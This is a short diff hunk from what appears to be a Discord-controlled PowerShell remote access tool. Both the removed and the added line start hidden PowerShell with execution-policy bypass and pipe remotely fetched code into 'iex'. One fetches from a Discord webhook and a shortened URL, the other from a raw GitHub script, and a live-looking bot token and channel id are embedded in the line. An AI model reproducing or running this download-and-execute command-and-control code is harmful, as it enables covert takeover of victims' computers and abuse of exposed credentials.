@@ -985,7 +985,7 @@ Function ScreenParty {
 }
 
 Function Powershell {
-    Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C `$dc='https://discord.com/api/webhooks/1512211575862329435/__PTyT_5jA8brTXqw-M7V06U9a0Mbuqt3dLXGXpu9lXM78lKxPl5Vwf2_TKX5LtG6NYM'; irm is.gd/bw0_kl_to_dc | iex")
+    Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -C `$ch = '1468006904923164918'; `$tk = 'MTUyNDQwMTM1MzI0MDIxOTcwOQ.GURqza.-_hCjXWFjAldWk5SPj_myTQk8PBF8s2QcK3WD4'; irm https://raw.githubusercontent.com/Lore-Bul/discord-ps-working/refs/heads/main/main.ps1 | iex")
     sendMsg -Message ":white_check_mark: ``classic powershell on other channel!`` :white_check_mark:"  
 }
 
